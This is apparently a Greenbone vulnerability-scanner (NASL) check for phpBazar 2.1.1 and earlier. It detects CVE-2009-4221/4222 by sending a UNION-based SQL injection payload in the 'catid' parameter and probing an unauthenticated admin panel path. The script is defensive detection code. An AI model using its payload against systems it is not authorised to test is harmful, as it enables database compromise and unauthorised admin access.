# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:smartisoft:phpbazar";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800465");
  script_version("2021-11-26T06:30:10+0000");
  script_tag(name:"last_modification", value:"2021-11-26 06:30:10 +0000 (Fri, 26 Nov 2021)");
  script_tag(name:"creation_date", value:"2010-02-17 08:26:50 +0100 (Wed, 17 Feb 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2009-4221", "CVE-2009-4222");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("phpBazar <= 2.1.1 SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_phpbazar_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpbazar/detected");

  script_tag(name:"summary", value:"phpBazar is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to error in 'classified.php' which can be
  exploited to cause SQL injection via the 'catid' parameter, and 'admin/admin.php' which allows to
  obtain access to the admin control panel via a direct request.");

  script_tag(name:"impact", value:"Successful exploitation could allow execution of arbitrary SQL
  commands in the affected application.");

  script_tag(name:"affected", value:"phpBazar version 2.1.1 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/54447");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/10245");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/0911-exploits/phpbazar211fix-sql.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/classified.php?catid=2+and+1=0+union+all+select+1,2,3,4,5,6,7--";

req = http_get(item: url, port: port);
res = http_send_recv(port: port, data: req);

if ("2 and 1=0 union all select 1,2,3,4,5,6,7--&subcatid=1" >< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
} else {
  url = dir + "/admin/admin.php";

  req = http_get(item: url, port: port);
  res = http_send_recv(port: port, data: req);

  if ("phpBazar-AdminPanel" >< res) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
